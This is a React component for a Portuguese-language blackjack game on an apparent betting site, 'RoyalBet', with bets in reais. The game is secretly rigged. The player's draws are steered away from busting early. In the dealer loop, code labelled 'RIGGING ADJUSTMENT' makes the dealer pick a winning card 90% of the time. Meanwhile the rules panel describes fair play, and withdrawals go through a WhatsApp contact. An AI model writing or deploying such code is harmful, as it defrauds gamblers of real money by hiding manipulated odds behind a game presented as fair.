import React, { useState, useEffect, useRef } from 'react';
import { Button } from './Button';
import { ArrowLeft, Hand, Octagon, Shield, HelpCircle, X, MessageCircle } from 'lucide-react';
import { Club, Diamond, Heart, Spade } from 'lucide-react';
import { UserProfile } from '../types';

interface BlackjackGameProps {
  user: UserProfile;
  onUpdateBalance: (newBalance: number, amountSpent: number) => void;
  onExit: () => void;
}

type Suit = 'hearts' | 'diamonds' | 'clubs' | 'spades';
type Rank = 'A' | '2' | '3' | '4' | '5' | '6' | '7' | '8' | '9' | '10' | 'J' | 'Q' | 'K';

interface Card {
  suit: Suit;
  rank: Rank;
  value: number;
  isHidden?: boolean;
}

const SUITS: Suit[] = ['hearts', 'diamonds', 'clubs', 'spades'];
const RANKS: Rank[] = ['A', '2', '3', '4', '5', '6', '7', '8', '9', '10', 'J', 'Q', 'K'];

const getCardValue = (rank: Rank): number => {
  if (['J', 'Q', 'K'].includes(rank)) return 10;
  if (rank === 'A') return 11; // Handled dynamically in score calc
  return parseInt(rank);
};

export const BlackjackGame: React.FC<BlackjackGameProps> = ({ user, onUpdateBalance, onExit }) => {
  const gameRef = useRef<HTMLDivElement>(null);
  
  const [betAmount, setBetAmount] = useState<string>('10');
  const [playerHand, setPlayerHand] = useState<Card[]>([]);
  const [dealerHand, setDealerHand] = useState<Card[]>([]);
  const [deck, setDeck] = useState<Card[]>([]);
  
  const [gameState, setGameState] = useState<'BETTING' | 'PLAYER_TURN' | 'DEALER_TURN' | 'GAME_OVER'>('BETTING');
  const [message, setMessage] = useState('Faça sua aposta para começar');
  const [lastWin, setLastWin] = useState(0);
  const [showRules, setShowRules] = useState(false);

  // --- Deck Logic ---
  const createDeck = () => {
    const newDeck: Card[] = [];
    for (const suit of SUITS) {
      for (const rank of RANKS) {
        newDeck.push({ suit, rank, value: getCardValue(rank) });
      }
    }
    return newDeck.sort(() => Math.random() - 0.5);
  };

  const calculateScore = (hand: Card[], hideHidden = false) => {
    let score = 0;
    let aces = 0;

    hand.forEach(card => {
      if (card.isHidden && hideHidden) return;
      score += card.value;
      if (card.rank === 'A') aces += 1;
    });

    while (score > 21 && aces > 0) {
      score -= 10;
      aces -= 1;
    }
    return score;
  };

  // --- Game Actions ---

  const startGame = () => {
    const bet = parseFloat(betAmount);
    if (isNaN(bet) || bet <= 0 || bet > user.balance) {
      setMessage(bet > user.balance ? 'Saldo insuficiente' : 'Aposta inválida');
      return;
    }

    if (gameRef.current) {
      gameRef.current.scrollIntoView({ behavior: 'smooth', block: 'start' });
    }

    setTimeout(() => {
      onUpdateBalance(user.balance - bet, bet);
      setLastWin(0);
      
      let currentDeck = createDeck();
      
      // Initial Deal
      const pCard1 = currentDeck[0];
      const dCard1 = currentDeck[1];
      const pCard2 = currentDeck[2];
      const dCard2 = { ...currentDeck[3], isHidden: true }; // Hidden dealer card

      currentDeck = currentDeck.slice(4);

      setPlayerHand([pCard1, pCard2]);
      setDealerHand([dCard1, dCard2]);
      setDeck(currentDeck);
      setGameState('PLAYER_TURN');
      setMessage('Sua vez...');

      // Check Instant Blackjack
      const pScore = calculateScore([pCard1, pCard2]);
      if (pScore === 21) {
        handleStand([pCard1, pCard2], [dCard1, dCard2], currentDeck);
      }
    }, 400);
  };

  const hit = () => {
    let currentDeck = [...deck];
    let cardToDraw: Card;
    let cardIndex = 0;

    // INTERACTION LOGIC:
    if (playerHand.length < 5) {
      const safeIndex = currentDeck.findIndex(c => {
        const tempHand = [...playerHand, c];
        return calculateScore(tempHand) <= 21;
      });

      if (safeIndex !== -1) {
        cardIndex = safeIndex;
      }
    }

    cardToDraw = currentDeck[cardIndex];
    currentDeck.splice(cardIndex, 1);

    const newHand = [...playerHand, cardToDraw];
    setPlayerHand(newHand);
    setDeck(currentDeck);

    const score = calculateScore(newHand);
    if (score > 21) {
      setGameState('GAME_OVER');
      setMessage('ESTOUROU! Você ultrapassou 21.');
    }
  };

  const stand = () => {
    handleStand(playerHand, dealerHand, deck);
  };

  const handleStand = async (pHand: Card[], dHand: Card[], currentDeck: Card[]) => {
    setGameState('DEALER_TURN');
    setMessage('Vez do Crupiê...');
    
    // Reveal dealer card
    let newDealerHand: Card[] = dHand.map(c => ({ ...c, isHidden: false }));
    setDealerHand(newDealerHand);
    
    let dScore = calculateScore(newDealerHand);
    let workingDeck = [...currentDeck];
    
    const pScore = calculateScore(pHand);

    // Small delay loop for visual effect
    const playDealerLoop = async () => {
      while (dScore < 17) {
        await new Promise(r => setTimeout(r, 1000)); // Delay between cards
        
        let cardToDraw: Card;

        // RIGGING ADJUSTMENT: 90% chance for dealer to "cheat"
        const shouldDealerCheat = Math.random() < 0.90;

        if (shouldDealerCheat && pScore <= 21 && dScore < pScore) {
          const targetMin = pScore - dScore; 
          const targetMax = 21 - dScore; 
          
          const magicCardIndex = workingDeck.findIndex(c => {
             const val = c.rank === 'A' ? 11 : getCardValue(c.rank); 
             return val >= targetMin && val <= targetMax;
          });

          if (magicCardIndex !== -1) {
             cardToDraw = workingDeck[magicCardIndex];
             workingDeck.splice(magicCardIndex, 1);
          } else {
             cardToDraw = workingDeck[0];
             workingDeck = workingDeck.slice(1);
          }
        } else {
          cardToDraw = workingDeck[0];
          workingDeck = workingDeck.slice(1);
        }
        
        newDealerHand = [...newDealerHand, cardToDraw];
        setDealerHand(newDealerHand);
        dScore = calculateScore(newDealerHand);
        setDeck(workingDeck);
      }
      determineWinner(pHand, newDealerHand);
    };

    playDealerLoop();
  };

  const determineWinner = (pHand: Card[], dHand: Card[]) => {
    const pScore = calculateScore(pHand);
    const dScore = calculateScore(dHand);
    const bet = parseFloat(betAmount);

    setGameState('GAME_OVER');

    if (dScore > 21) {
      // Dealer Bust
      const win = bet * 2;
      onUpdateBalance(user.balance + win, 0);
      setLastWin(win);
      setMessage(`CRUPIÊ ESTOUROU! Você ganhou R$ ${win.toFixed(2)}`);
    } else if (pScore > dScore) {
      // Player Wins
      const isBlackjack = pScore === 21 && pHand.length === 2;
      const multiplier = isBlackjack ? 2.5 : 2.0;
      const win = bet * multiplier;
      
      onUpdateBalance(user.balance + win, 0);
      setLastWin(win);
      setMessage(isBlackjack ? `BLACKJACK! R$ ${win.toFixed(2)}` : `VOCÊ VENCEU! R$ ${win.toFixed(2)}`);
    } else if (pScore === dScore) {
      // Push
      onUpdateBalance(user.balance + bet, 0);
      setMessage('EMPATE. Aposta devolvida.');
    } else {
      // Loss
      setMessage(`O Crupiê venceu com ${dScore}.`);
    }
  };

  const renderCard = (card: Card, index: number) => {
    if (card.isHidden) {
      return (
        <div key={index} className="w-20 h-28 md:w-28 md:h-40 bg-royal-900 border-2 border-royal-600 rounded-lg shadow-xl flex items-center justify-center relative bg-[url('https://www.transparenttextures.com/patterns/cubes.png')] transition-all duration-300">
          <div className="w-16 h-24 md:w-24 md:h-36 border border-royal-700 rounded flex items-center justify-center">
             <Shield className="text-royal-700/50" size={32} />
          </div>
        </div>
      );
    }

    const isRed = card.suit === 'hearts' || card.suit === 'diamonds';
    const Icon = {
      hearts: Heart,
      diamonds: Diamond,
      clubs: Club,
      spades: Spade
    }[card.suit];

    return (
      <div 
        key={index} 
        style={{ animationDelay: `${index * 100}ms` }}
        className={`
          w-20 h-28 md:w-28 md:h-40 bg-gray-100 rounded-lg shadow-[0_0_15px_rgba(0,0,0,0.5)] relative select-none animate-slide-up
          flex flex-col justify-between p-2 hover:-translate-y-2 transition-transform duration-300
        `}
      >
        <div className={`text-lg md:text-xl font-bold font-display ${isRed ? 'text-red-600' : 'text-slate-900'}`}>
          {card.rank}
        </div>
        <div className="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2">
           <Icon size={36} className={isRed ? 'text-red-600' : 'text-slate-900'} fill={isRed ? 'currentColor' : 'none'} />
        </div>
        <div className={`text-lg md:text-xl font-bold font-display self-end rotate-180 ${isRed ? 'text-red-600' : 'text-slate-900'}`}>
          {card.rank}
        </div>
      </div>
    );
  };

  return (
    <div ref={gameRef} className="w-full max-w-6xl mx-auto animate-fade-in flex flex-col md:flex-row gap-6 scroll-mt-4">
      
      {/* Sidebar Controls */}
      <div className="w-full md:w-72 bg-royal-900/80 backdrop-blur-xl border border-royal-700 rounded-2xl p-6 h-fit order-2 md:order-1 flex flex-col">
        <div className="flex items-center justify-between mb-6">
           <div className="text-neon-yellow font-bold text-sm bg-royal-800 px-3 py-1 rounded-full border border-royal-700 shadow-neon">
             SALDO: R$ {user.balance.toFixed(2)}
          </div>
          <button onClick={() => setShowRules(true)} className="text-gray-400 hover:text-white">
            <HelpCircle size={20} />
          </button>
        </div>

        <h2 className="text-xl font-display font-bold text-white mb-6">
          BLACKJACK <span className="text-neon-yellow">21</span>
        </h2>

        {/* Rules Modal */}
        {showRules && (
          <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/80 backdrop-blur-sm p-4 animate-fade-in">
            <div className="bg-royal-800 border border-royal-600 rounded-xl p-6 max-w-md w-full relative shadow-2xl">
              <button 
                onClick={() => setShowRules(false)}
                className="absolute top-4 right-4 text-gray-400 hover:text-white"
              >
                <X size={24} />
              </button>
              <h3 className="text-xl font-display font-bold text-white mb-4 flex items-center gap-2">
                <HelpCircle className="text-neon-yellow" /> Regras do Jogo
              </h3>
              <ul className="space-y-2 text-sm text-gray-300 list-disc pl-5">
                <li>O objetivo é fazer 21 pontos ou chegar mais perto que o Crupiê.</li>
                <li><strong>Valete, Dama e Rei</strong> valem 10.</li>
                <li><strong>Ás</strong> vale 1 ou 11.</li>
                <li>O Crupiê para quando tiver 17 ou mais.</li>
                <li>Se passar de 21, você perde.</li>
              </ul>
            </div>
          </div>
        )}

        <div className="space-y-6 flex-grow">
          <div>
            <label className="block text-gray-400 text-xs font-bold mb-2 uppercase">Valor da Aposta</label>
            <div className="relative">
              <span className="absolute left-3 top-3 text-neon-yellow font-bold">R$</span>
              <input 
                type="number" 
                value={betAmount}
                onChange={(e) => setBetAmount(e.target.value)}
                disabled={gameState === 'PLAYER_TURN' || gameState === 'DEALER_TURN'}
                className="w-full bg-royal-800 text-white border-2 border-royal-700 rounded-lg py-3 pl-10 pr-4 focus:border-neon-yellow focus:outline-none transition-colors font-bold disabled:opacity-50 disabled:cursor-not-allowed"
              />
            </div>
          </div>

          <Button 
             onClick={startGame} 
             disabled={gameState === 'PLAYER_TURN' || gameState === 'DEALER_TURN' || user.balance <= 0}
             className={gameState === 'GAME_OVER' ? 'animate-pulse' : ''}
          >
             {gameState === 'BETTING' ? 'APOSTAR' : 'NOVA MÃO'}
          </Button>

          {lastWin > 0 && (
            <a 
              href="https://wa.me/5534984331211?text=Ol%C3%A1%2C%20ganhei%20no%20RoyalBet%20e%20gostaria%20de%20solicitar%20um%20saque!"
              target="_blank"
              rel="noopener noreferrer"
              className="mt-4 w-full bg-green-500 hover:bg-green-600 text-white font-bold py-3 px-4 rounded-lg flex items-center justify-center gap-2 animate-bounce shadow-lg transition-colors"
            >
              <MessageCircle size={20} />
              FALAR COM SUPORTE PARA SAQUE
            </a>
          )}
        </div>

        <div className="pt-6 mt-6 border-t border-royal-700">
          <Button variant="secondary" onClick={onExit} className="flex items-center justify-center gap-2 text-sm" disabled={gameState === 'PLAYER_TURN' || gameState === 'DEALER_TURN'}>
            <ArrowLeft size={16} /> LOBBY
          </Button>
        </div>
      </div>

      {/* Game Table */}
      <div className="flex-1 bg-royal-800 rounded-3xl border-8 border-royal-900 relative min-h-[600px] order-1 md:order-2 overflow-hidden flex flex-col shadow-2xl">
        {/* Felt Texture */}
        <div className="absolute inset-0 bg-[radial-gradient(circle_at_center,_var(--tw-gradient-stops))] from-blue-900/40 via-royal-900/60 to-royal-950/90 pointer-events-none"></div>
        <div className="absolute inset-0 bg-[url('https://www.transparenttextures.com/patterns/felt.png')] opacity-30 pointer-events-none mix-blend-overlay"></div>
        
        {/* Dealer Area (Top) */}
        <div className="flex-1 flex flex-col items-center justify-start pt-12 relative z-10">
          <div className="flex gap-[-4rem] justify-center -space-x-12 md:-space-x-16 perspective-1000">
            {dealerHand.map((card, i) => renderCard(card, i))}
            {dealerHand.length === 0 && gameState === 'BETTING' && (
               <div className="w-20 h-28 md:w-28 md:h-40 border-2 border-dashed border-white/10 rounded-lg flex items-center justify-center text-white/10 text-xs uppercase tracking-widest font-bold">Baralho</div>
            )}
          </div>
          <div className="mt-4 text-gray-400 font-display text-xs uppercase tracking-widest flex items-center gap-2 bg-black/20 px-4 py-1 rounded-full backdrop-blur-sm border border-white/5">
             <Shield size={12} /> Crupiê {dealerHand.length > 0 && gameState !== 'BETTING' && `(${calculateScore(dealerHand, true)})`}
          </div>
        </div>

        {/* Message Center */}
        <div className="absolute top-[40%] left-1/2 -translate-x-1/2 -translate-y-1/2 z-30 pointer-events-none w-full text-center">
           <div className={`transition-all duration-300 transform ${gameState === 'GAME_OVER' ? 'scale-110' : 'scale-100'}`}>
              <span className={`
                inline-block px-8 py-3 rounded-full backdrop-blur-md border border-white/10 shadow-2xl font-display font-black text-xl md:text-2xl uppercase tracking-wider
                ${gameState === 'GAME_OVER' 
                  ? (lastWin > 0 ? 'bg-neon-yellow/90 text-royal-900 border-neon-yellow animate-bounce' : 'bg-red-600/90 text-white border-red-500') 
                  : 'bg-royal-900/60 text-white'
                }
              `}>
                {message}
              </span>
           </div>
        </div>

        {/* Player Area (Bottom) */}
        <div className="flex-1 flex flex-col items-center justify-end pb-8 relative z-10">
          
          {/* Action Buttons */}
          {gameState === 'PLAYER_TURN' && (
             <div className="flex gap-4 mb-8 animate-fade-in z-40">
                <button 
                  onClick={hit}
                  className="group relative flex flex-col items-center gap-1 transition-transform hover:-translate-y-1 active:translate-y-0"
                >
                  <div className="w-16 h-16 rounded-full bg-green-500 border-4 border-green-400 shadow-[0_0_20px_rgba(34,197,94,0.5)] flex items-center justify-center text-royal-900 group-hover:bg-green-400">
                     <Hand size={32} strokeWidth={3} />
                  </div>
                  <span className="bg-black/50 text-white text-xs font-bold px-3 py-1 rounded-full border border-white/10 backdrop-blur-sm uppercase">Pedir</span>
                </button>

                <button 
                  onClick={stand}
                  className="group relative flex flex-col items-center gap-1 transition-transform hover:-translate-y-1 active:translate-y-0"
                >
                  <div className="w-16 h-16 rounded-full bg-red-500 border-4 border-red-400 shadow-[0_0_20px_rgba(239,68,68,0.5)] flex items-center justify-center text-white group-hover:bg-red-400">
                     <Octagon size={32} strokeWidth={3} />
                  </div>
                  <span className="bg-black/50 text-white text-xs font-bold px-3 py-1 rounded-full border border-white/10 backdrop-blur-sm uppercase">Parar</span>
                </button>
             </div>
          )}

          <div className="flex gap-[-4rem] justify-center -space-x-12 md:-space-x-16 mb-4 perspective-1000">
            {playerHand.map((card, i) => renderCard(card, i))}
             {playerHand.length === 0 && gameState === 'BETTING' && (
               <div className="w-20 h-28 md:w-28 md:h-40 border-2 border-dashed border-white/10 rounded-lg flex items-center justify-center text-white/10 text-xs uppercase tracking-widest font-bold">Você</div>
            )}
          </div>
          
          <div className="mt-2 text-neon-yellow font-display text-lg font-bold uppercase tracking-widest bg-royal-950/80 px-6 py-2 rounded-full border border-neon-yellow/30 shadow-neon">
             Você {playerHand.length > 0 && `(${calculateScore(playerHand)})`}
          </div>
        </div>
      </div>

    </div>
  );
};